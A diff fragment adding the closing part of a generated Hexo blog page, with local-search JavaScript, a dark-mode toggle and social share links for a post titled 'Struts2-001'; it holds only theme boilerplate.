+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>No result<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The search.xml file was not found, please refer to：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The request failed, Try to refresh the page or try again later.<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + Struts2-001 + '&url=' + https%3A%2F%2Fki10moc.github.io%2F2023%2F01%2F28%2FStruts2-001%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=https://ki10moc.github.io/2023/01/28/Struts2-001/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  </body>
+</html>
